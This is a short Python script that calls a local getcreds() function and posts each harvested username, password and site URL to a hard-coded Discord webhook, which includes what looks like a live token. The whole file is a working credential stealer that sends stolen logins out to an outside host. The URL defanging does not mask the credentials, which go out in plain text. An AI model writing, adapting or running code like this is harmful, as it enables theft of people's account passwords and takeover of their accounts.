import requests
from creds import getcreds

discord_webhook = "https://discord.com/api/webhooks/1467885201165259057/KdCjjr51kGN90FFgniGmV9ErZb7Q5Z6AF61kjhgv6EoWjKyPHgrIgGb0D9r1SMqrn-03"

a = getcreds()


for i in a:
    def defang_url(url):
        return url.replace("http", "hXXp").replace(".", "[.]")
    url = i['url']
    safeurl = defang_url(url=url)
    percred = f"{i['uname']}:{i['pass']}@{safeurl}"
    data = {"content":percred}
    requests.post(discord_webhook,json=data)